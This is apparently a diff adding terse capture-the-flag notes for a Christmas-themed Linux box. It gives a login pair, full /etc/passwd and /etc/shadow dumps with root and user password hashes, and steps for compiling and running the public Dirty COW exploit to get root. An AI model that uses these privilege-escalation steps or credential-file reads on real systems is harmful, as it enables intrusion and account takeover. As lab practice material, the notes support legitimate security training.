@@ -1,0 +1,92 @@
+Username: santa
+Password: clauschristmas
+
+
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/bin/sh
+bin:x:2:2:bin:/bin:/bin/sh
+sys:x:3:3:sys:/dev:/bin/sh
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/bin/sh
+man:x:6:12:man:/var/cache/man:/bin/sh
+lp:x:7:7:lp:/var/spool/lpd:/bin/sh
+mail:x:8:8:mail:/var/mail:/bin/sh
+news:x:9:9:news:/var/spool/news:/bin/sh
+uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
+proxy:x:13:13:proxy:/bin:/bin/sh
+www-data:x:33:33:www-data:/var/www:/bin/sh
+backup:x:34:34:backup:/var/backups:/bin/sh
+list:x:38:38:Mailing List Manager:/var/list:/bin/sh
+irc:x:39:39:ircd:/var/run/ircd:/bin/sh
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
+nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
+libuuid:x:100:101::/var/lib/libuuid:/bin/sh
+syslog:x:101:103::/home/syslog:/bin/false
+messagebus:x:102:105::/var/run/dbus:/bin/false
+ntp:x:103:108::/home/ntp:/bin/false
+sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin
+vboxadd:x:999:1::/var/run/vboxadd:/bin/false
+statd:x:105:65534::/var/lib/nfs:/bin/false
+telnetd:x:106:111::/nonexistent:/bin/false
+santa:x:1001:1003::/home/santa:/bin/sh
+
+
+
+
+
+https://dirtycow.ninja/
+https://github.com/FireFart/dirtycow/blob/master/dirty.c
+
+
+*some technical issues
+
+$gcc -pthread dirty.c -o dirty -lcrypt
+dirty.c:195:5: error: stray '\302' in program
+dirty.c:195:5: error: stray '\251' in program
+dirty.c:195:8: error: expected identifier or '(' before numeric constant
+
+*need to remove regular text from github from file (at the top and bottom)
+
+;)
+
+$su firefart
+$cd /root
+$touch coal
+$tree | md5sum > coal
+
+
+
+
+
+*this is after I changed santa's passwd for easy ssh
+
+root:$6$hTVx0Nb6$STbmlfynx7Fphiur3GYWbsp0Ssuzu7s5gMb3MJHB2R6HLPZONzRXTkVOKpZWudD9meS.3SNPFmbYdKNwWzarm.:18587:0:99999:7:::
+daemon:*:15597:0:99999:7:::
+bin:*:15597:0:99999:7:::
+sys:*:15597:0:99999:7:::
+sync:*:15597:0:99999:7:::
+games:*:15597:0:99999:7:::
+man:*:15597:0:99999:7:::
+lp:*:15597:0:99999:7:::
+mail:*:15597:0:99999:7:::
+news:*:15597:0:99999:7:::
+uucp:*:15597:0:99999:7:::
+proxy:*:15597:0:99999:7:::
+www-data:*:15597:0:99999:7:::
+backup:*:15597:0:99999:7:::
+list:*:15597:0:99999:7:::
+irc:*:15597:0:99999:7:::
+gnats:*:15597:0:99999:7:::
+nobody:*:15597:0:99999:7:::
+libuuid:!:15597:0:99999:7:::
+syslog:*:15597:0:99999:7:::
+messagebus:*:15597:0:99999:7:::
+ntp:*:15597:0:99999:7:::
+sshd:*:15597:0:99999:7:::
+vboxadd:!:15597::::::
+statd:*:15597:0:99999:7:::
+telnetd:*:18587:0:99999:7:::
+santa:$6$9nnp7uei$HSxGwuWMJG7IRqnTxOhao1sAuBKOJcNnf4be4sb0uGYuhLzdIkDk7cm7OFdfv2tuq..f3jpUI9S3v4snnsp2Y0:18609:0:99999:7:::
+
+
